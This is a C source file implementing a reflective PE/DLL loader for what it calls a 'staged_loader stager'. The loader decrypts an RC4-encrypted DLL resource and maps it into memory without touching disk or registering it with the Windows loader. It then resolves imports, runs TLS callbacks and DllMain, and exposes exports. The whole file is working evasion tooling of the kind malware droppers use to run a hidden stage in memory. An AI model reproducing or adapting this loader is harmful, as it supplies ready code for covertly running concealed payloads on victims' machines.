/*
 * reflect - minimal reflective PE (DLL) loader for the staged_loader stager.
 *
 * The stager executable carries the real loader as an RC4-encrypted DLL
 * resource. This file maps that DLL into memory without touching disk and
 * without registering it with the Windows loader, then exposes its exports:
 *
 *   reflect_load   parse headers, map sections, apply relocations, resolve
 *                  the import table via the real LoadLibraryA/GetProcAddress,
 *                  fix section protections, set up TLS and run the DLL entry
 *                  point (DllMainCRTStartup for MinGW) with
 *                  DLL_PROCESS_ATTACH.
 *   reflect_export resolve a named export from the mapped image.
 *
 * Every offset derived from the (untrusted-at-rest but still validated)
 * image is bounds-checked against SizeOfImage / the raw buffer so a corrupt
 * or truncated blob fails cleanly instead of faulting. The code is shared by
 * x64 and x86 builds; only the relocation and ordinal encodings differ.
 */
#include "reflect.h"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <string.h>

#define REFLECT_MAX_SECTIONS 96

typedef BOOL(WINAPI *reflect_dllmain_fn)(HINSTANCE, DWORD, LPVOID);

static int range_ok(const unsigned char *base, SIZE_T size, SIZE_T off,
                    SIZE_T len) {
  (void)base; /* kept for call-site symmetry with in_image */
  return off <= size && len <= size - off;
}

/* in_image verifies that a pointer derived from the mapped image lies inside
 * [mapped, mapped+SizeOfImage). Used before dereferencing import/export/TLS
 * structures, which a malformed image could point anywhere. */
static int in_image(const unsigned char *mapped, SIZE_T image_size,
                    const void *ptr, SIZE_T len) {
  ULONG_PTR start = (ULONG_PTR)mapped;
  ULONG_PTR p = (ULONG_PTR)ptr;

  if (p < start) {
    return 0;
  }
  return range_ok(mapped, image_size, (SIZE_T)(p - start), len);
}

static IMAGE_NT_HEADERS *nt_headers(const unsigned char *image,
                                    SIZE_T image_len) {
  IMAGE_DOS_HEADER *dos;
  IMAGE_NT_HEADERS *nt;
  DWORD e_lfanew;

  if (image_len < sizeof(IMAGE_DOS_HEADER)) {
    return NULL;
  }
  dos = (IMAGE_DOS_HEADER *)image;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
    return NULL;
  }
  e_lfanew = (DWORD)dos->e_lfanew;
  if (!range_ok(image, image_len, e_lfanew, sizeof(IMAGE_NT_HEADERS))) {
    return NULL;
  }
  nt = (IMAGE_NT_HEADERS *)(image + e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE) {
    return NULL;
  }
#ifdef _WIN64
  if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    return NULL;
  }
  if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
    return NULL;
  }
#else
  if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
    return NULL;
  }
  if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
    return NULL;
  }
#endif
  return nt;
}

#if defined(_WIN64)
static int snap_by_ordinal(ULONG_PTR v) { return IMAGE_SNAP_BY_ORDINAL64(v); }
static WORD ordinal_of(ULONG_PTR v) { return (WORD)IMAGE_ORDINAL64(v); }
#else
static int snap_by_ordinal(ULONG_PTR v) { return IMAGE_SNAP_BY_ORDINAL32(v); }
static WORD ordinal_of(ULONG_PTR v) { return (WORD)IMAGE_ORDINAL32(v); }
#endif

static DWORD section_protect(DWORD characteristics) {
  int exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
  int read = (characteristics & IMAGE_SCN_MEM_READ) != 0;
  int write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

  if (exec && write) {
    /* W^X: refuse to create an RWX mapping. The stage is not self-modifying,
     * so a writable+executable section is treated as a malformed image and
     * the caller fails instead of mapping it RWX. */
    return 0;
  }
  if (exec) {
    return read ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
  }
  if (write) {
    return PAGE_READWRITE;
  }
  if (read) {
    return PAGE_READONLY;
  }
  return PAGE_NOACCESS;
}

static int map_sections(const unsigned char *image, SIZE_T image_len,
                        unsigned char *mapped, SIZE_T image_size,
                        IMAGE_NT_HEADERS *nt) {
  IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
  SIZE_T header_size = nt->OptionalHeader.SizeOfHeaders;
  WORD count = nt->FileHeader.NumberOfSections;
  WORD i;

  if (count == 0 || count > REFLECT_MAX_SECTIONS) {
    return 0;
  }
  if (!range_ok(image, image_len, (SIZE_T)((unsigned char *)sec - image),
                (SIZE_T)count * sizeof(IMAGE_SECTION_HEADER))) {
    return 0;
  }
  /* Copy the headers (and the section table) verbatim. */
  if (header_size > image_size || header_size > image_len) {
    return 0;
  }
  memcpy(mapped, image, header_size);

  for (i = 0; i < count; i++) {
    SIZE_T raw = sec[i].SizeOfRawData;
    SIZE_T va = sec[i].VirtualAddress;
    SIZE_T vsize = sec[i].Misc.VirtualSize;
    SIZE_T copy;

    if (vsize == 0) {
      continue;
    }
    if (!range_ok(image, image_len, sec[i].PointerToRawData, raw)) {
      return 0;
    }
    if (!range_ok(mapped, image_size, va, vsize)) {
      return 0;
    }
    copy = raw < vsize ? raw : vsize;
    if (raw != 0) {
      memcpy(mapped + va, image + sec[i].PointerToRawData, copy);
    }
  }
  return 1;
}

static int apply_relocations(unsigned char *mapped, SIZE_T image_size,
                             IMAGE_NT_HEADERS *nt, ULONG_PTR delta) {
  IMAGE_DATA_DIRECTORY *dir =
      &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
  ULONG_PTR end;
  IMAGE_BASE_RELOCATION *block;

  if (delta == 0) {
    return 1;
  }
  if (dir->VirtualAddress == 0 || dir->Size < sizeof(IMAGE_BASE_RELOCATION)) {
    /* No relocation table and we could not map at the preferred base. */
    return 0;
  }
  if (!range_ok(mapped, image_size, dir->VirtualAddress, dir->Size)) {
    return 0;
  }
  end = (ULONG_PTR)mapped + dir->VirtualAddress + dir->Size;
  block = (IMAGE_BASE_RELOCATION *)(mapped + dir->VirtualAddress);

  while ((ULONG_PTR)block < end) {
    SIZE_T block_off;
    DWORD count;
    WORD *entries;
    DWORD i;

    if ((ULONG_PTR)block + sizeof(IMAGE_BASE_RELOCATION) > end ||
        block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) {
      return 0;
    }
    block_off = (SIZE_T)((ULONG_PTR)block - (ULONG_PTR)mapped);
    if (!range_ok(mapped, image_size, block_off, block->SizeOfBlock)) {
      return 0;
    }
    count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
            sizeof(WORD);
    entries = (WORD *)((unsigned char *)block + sizeof(IMAGE_BASE_RELOCATION));

    for (i = 0; i < count; i++) {
      int type = entries[i] >> 12;
      SIZE_T off = block->VirtualAddress + (entries[i] & 0x0FFF);
      unsigned char *patch = mapped + off;
      SIZE_T width;

      switch (type) {
      case IMAGE_REL_BASED_ABSOLUTE:
        continue;
#ifdef _WIN64
      case IMAGE_REL_BASED_DIR64:
        width = sizeof(ULONG_PTR);
        break;
#else
      case IMAGE_REL_BASED_HIGHLOW:
        width = sizeof(ULONG_PTR);
        break;
#endif
      default:
        return 0;
      }
      if (!range_ok(mapped, image_size, off, width)) {
        return 0;
      }
      *(ULONG_PTR *)patch += delta;
    }
    block = (IMAGE_BASE_RELOCATION *)((unsigned char *)block +
                                      block->SizeOfBlock);
  }
  return 1;
}

static int resolve_imports(unsigned char *mapped, SIZE_T image_size,
                           IMAGE_NT_HEADERS *nt) {
  IMAGE_DATA_DIRECTORY *dir =
      &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
  IMAGE_IMPORT_DESCRIPTOR *imp;

  if (dir->VirtualAddress == 0) {
    return 1;
  }
  if (dir->Size != 0 &&
      !range_ok(mapped, image_size, dir->VirtualAddress, dir->Size)) {
    return 0;
  }
  imp = (IMAGE_IMPORT_DESCRIPTOR *)(mapped + dir->VirtualAddress);

  for (;;) {
    const char *dll;
    HMODULE module;
    PIMAGE_THUNK_DATA oft = NULL;
    PIMAGE_THUNK_DATA ft;

    if (!in_image(mapped, image_size, imp, sizeof(*imp))) {
      return 0;
    }
    if (imp->Name == 0) {
      break;
    }
    if (!in_image(mapped, image_size, mapped + imp->Name, 1)) {
      return 0;
    }
    dll = (const char *)(mapped + imp->Name);
    module = LoadLibraryA(dll);
    if (module == NULL) {
      return 0;
    }
    if (imp->OriginalFirstThunk != 0) {
      oft = (PIMAGE_THUNK_DATA)(mapped + imp->OriginalFirstThunk);
      if (!in_image(mapped, image_size, oft, sizeof(*oft))) {
        return 0;
      }
    }
    ft = (PIMAGE_THUNK_DATA)(mapped + imp->FirstThunk);
    if (!in_image(mapped, image_size, ft, sizeof(*ft))) {
      return 0;
    }

    for (;;) {
      ULONG_PTR lookup = oft ? oft->u1.AddressOfData : ft->u1.AddressOfData;
      FARPROC proc;

      if (lookup == 0) {
        break;
      }
      if (snap_by_ordinal(lookup)) {
        proc = GetProcAddress(module, (LPCSTR)(ULONG_PTR)ordinal_of(lookup));
      } else {
        IMAGE_IMPORT_BY_NAME *name;
        if (!in_image(mapped, image_size, mapped + lookup,
                      sizeof(IMAGE_IMPORT_BY_NAME))) {
          return 0;
        }
        name = (IMAGE_IMPORT_BY_NAME *)(mapped + lookup);
        if (!in_image(mapped, image_size, name->Name, 1)) {
          return 0;
        }
        proc = GetProcAddress(module, (LPCSTR)name->Name);
      }
      if (proc == NULL) {
        return 0;
      }
      ft->u1.Function = (ULONG_PTR)proc;
      if (oft) {
        oft++;
      }
      ft++;
      if (!in_image(mapped, image_size, ft, sizeof(*ft))) {
        return 0;
      }
      if (oft && !in_image(mapped, image_size, oft, sizeof(*oft))) {
        return 0;
      }
    }
    imp++;
  }
  return 1;
}

static int setup_tls(unsigned char *mapped, SIZE_T image_size,
                     IMAGE_NT_HEADERS *nt, int *out_index) {
  IMAGE_DATA_DIRECTORY *dir =
      &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
  IMAGE_TLS_DIRECTORY *tls;
  DWORD index;
  SIZE_T data_size, total;
  void *block;

  *out_index = -1;
  if (dir->VirtualAddress == 0) {
    return 1;
  }
  if (!range_ok(mapped, image_size, dir->VirtualAddress, dir->Size) ||
      dir->Size < sizeof(IMAGE_TLS_DIRECTORY)) {
    return 0;
  }
  tls = (IMAGE_TLS_DIRECTORY *)(mapped + dir->VirtualAddress);

  index = TlsAlloc();
  if (index == TLS_OUT_OF_INDEXES) {
    return 0;
  }
  if (tls->AddressOfIndex != 0) {
    if (!in_image(mapped, image_size, (void *)tls->AddressOfIndex,
                  sizeof(DWORD))) {
      TlsFree(index);
      return 0;
    }
    *(DWORD *)tls->AddressOfIndex = index;
  }

  data_size = (SIZE_T)(tls->EndAddressOfRawData - tls->StartAddressOfRawData);
  total = data_size + tls->SizeOfZeroFill;
  block = calloc(1, total ? total : 1);
  if (block == NULL) {
    TlsFree(index);
    return 0;
  }
  if (data_size != 0) {
    memcpy(block, (void *)tls->StartAddressOfRawData, data_size);
  }
  if (!TlsSetValue(index, block)) {
    free(block);
    TlsFree(index);
    return 0;
  }
  *out_index = (int)index;

  if (tls->AddressOfCallBacks != 0) {
    PIMAGE_TLS_CALLBACK *cb =
        (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
    if (!in_image(mapped, image_size, cb, sizeof(*cb))) {
      return 0;
    }
    while (*cb != NULL) {
      (*cb)((PVOID)mapped, DLL_PROCESS_ATTACH, NULL);
      cb++;
      if (!in_image(mapped, image_size, cb, sizeof(*cb))) {
        return 0;
      }
    }
  }
  return 1;
}

static int protect_sections(unsigned char *mapped, SIZE_T image_size,
                            IMAGE_NT_HEADERS *nt) {
  IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
  WORD count = nt->FileHeader.NumberOfSections;
  WORD i;

  for (i = 0; i < count; i++) {
    SIZE_T size = sec[i].SizeOfRawData;
    SIZE_T va = sec[i].VirtualAddress;
    DWORD old = 0;
    DWORD protect;

    if (size == 0) {
      continue;
    }
    if (!range_ok(mapped, image_size, va, size)) {
      return 0;
    }
    protect = section_protect(sec[i].Characteristics);
    if (protect == 0) {
      /* Executable+writable section: refuse rather than map it RWX. */
      return 0;
    }
    if (!VirtualProtect(mapped + va, size, protect, &old)) {
      return 0;
    }
  }
  return 1;
}

static int force_any_base(void) {
  /*
   * Test hook: when set, skip the preferred-base allocation so the
   * relocation path runs even on a process where the linked base happens to
   * be free. Only affects where this image is mapped; it is never derived
   * from remote input.
   */
  char buf[8];
  DWORD n = GetEnvironmentVariableA("STAGED_LOADER_FORCE_RELOC", buf,
                                    sizeof(buf));
  return n == 1 && buf[0] == '1';
}

void *reflect_load(const unsigned char *image, size_t image_len) {
  IMAGE_NT_HEADERS *nt;
  SIZE_T image_size;
  SIZE_T header_size;
  unsigned char *base;
  ULONG_PTR delta;
  int tls_index;
  reflect_dllmain_fn entry;

  nt = nt_headers(image, image_len);
  if (nt == NULL) {
    return NULL;
  }
  image_size = nt->OptionalHeader.SizeOfImage;
  header_size = nt->OptionalHeader.SizeOfHeaders;
  if (image_size < header_size || image_size > 0x40000000u) {
    return NULL;
  }

  /* Prefer the linked base so most images need no relocation. */
  base = NULL;
  if (!force_any_base()) {
    base = (unsigned char *)VirtualAlloc(
        (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase, image_size,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
  }
  if (base == NULL) {
    base = (unsigned char *)VirtualAlloc(NULL, image_size,
                                         MEM_RESERVE | MEM_COMMIT,
                                         PAGE_READWRITE);
  }
  if (base == NULL) {
    return NULL;
  }

  if (!map_sections(image, image_len, base, image_size, nt)) {
    goto fail;
  }

  delta = (ULONG_PTR)base - (ULONG_PTR)nt->OptionalHeader.ImageBase;
  if (!apply_relocations(base, image_size, nt, delta)) {
    goto fail;
  }
  if (!resolve_imports(base, image_size, nt)) {
    goto fail;
  }
  if (!setup_tls(base, image_size, nt, &tls_index)) {
    goto fail;
  }
  if (!protect_sections(base, image_size, nt)) {
    goto fail;
  }
  FlushInstructionCache(GetCurrentProcess(), base, image_size);

  if (nt->OptionalHeader.AddressOfEntryPoint >= image_size) {
    goto fail;
  }
  entry = (reflect_dllmain_fn)(base +
                               nt->OptionalHeader.AddressOfEntryPoint);
  if (!entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL)) {
    goto fail;
  }
  return base;

fail:
  VirtualFree(base, 0, MEM_RELEASE);
  return NULL;
}

void *reflect_export(void *base, const char *name) {
  unsigned char *mapped = (unsigned char *)base;
  IMAGE_DOS_HEADER *dos;
  IMAGE_NT_HEADERS *nt;
  IMAGE_DATA_DIRECTORY *dir;
  IMAGE_EXPORT_DIRECTORY *exp;
  DWORD *names;
  WORD *ords;
  DWORD *funcs;
  DWORD i;
  SIZE_T image_size;

  if (base == NULL || name == NULL) {
    return NULL;
  }
  dos = (IMAGE_DOS_HEADER *)mapped;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
    return NULL;
  }
  nt = (IMAGE_NT_HEADERS *)(mapped + dos->e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE) {
    return NULL;
  }
  image_size = nt->OptionalHeader.SizeOfImage;
  dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (dir->VirtualAddress == 0 ||
      !range_ok(mapped, image_size, dir->VirtualAddress, dir->Size) ||
      dir->Size < sizeof(IMAGE_EXPORT_DIRECTORY)) {
    return NULL;
  }
  exp = (IMAGE_EXPORT_DIRECTORY *)(mapped + dir->VirtualAddress);
  if (exp->AddressOfNames == 0 || exp->AddressOfNameOrdinals == 0 ||
      exp->AddressOfFunctions == 0) {
    return NULL;
  }
  names = (DWORD *)(mapped + exp->AddressOfNames);
  ords = (WORD *)(mapped + exp->AddressOfNameOrdinals);
  funcs = (DWORD *)(mapped + exp->AddressOfFunctions);

  if (!in_image(mapped, image_size, names,
                (SIZE_T)exp->NumberOfNames * sizeof(DWORD)) ||
      !in_image(mapped, image_size, ords,
                (SIZE_T)exp->NumberOfNames * sizeof(WORD)) ||
      !in_image(mapped, image_size, funcs,
                (SIZE_T)exp->NumberOfFunctions * sizeof(DWORD))) {
    return NULL;
  }
  for (i = 0; i < exp->NumberOfNames; i++) {
    const char *candidate;
    if (!in_image(mapped, image_size, mapped + names[i], 1)) {
      return NULL;
    }
    candidate = (const char *)(mapped + names[i]);
    if (strcmp(candidate, name) == 0) {
      WORD ord = ords[i];
      if (ord >= exp->NumberOfFunctions) {
        return NULL;
      }
      if (!in_image(mapped, image_size, mapped + funcs[ord], 1)) {
        return NULL;
      }
      return mapped + funcs[ord];
    }
  }
  return NULL;
}
